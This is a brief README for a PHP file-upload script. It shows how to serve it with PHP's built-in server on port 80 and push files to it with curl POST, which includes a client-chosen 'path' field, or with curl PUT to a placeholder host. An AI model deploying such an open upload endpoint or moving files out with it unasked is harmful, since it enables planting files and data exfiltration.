## php-upload.php
This is just an easy way to quickly transfer files via PUT or HTTP. The file will be uploaded to the directory from where the server is started. Make sure the directory has the correct permissions in order for this to work properly. (rename the file to index.php for easier handling)

Can be used in different ways.
Use it either with php-server, apache2, or nginx.

For use with php-server
```
php -S 0.0.0.0:80
```
a) Either navigate to the address and use the form and upload a file

or

b) Use curl with PUTÂ¹ or POST.
```
curl -XPOST -F "file=@file.txt" -F "path=/" http://ip-to-your-php-server/
```
(1) For PUT you need to use a PUT supported webserver, like nginx or apache2. Once configured properly you can use this command.
```
curl -T file.txt http://ip-to-your-PUT-server/
```
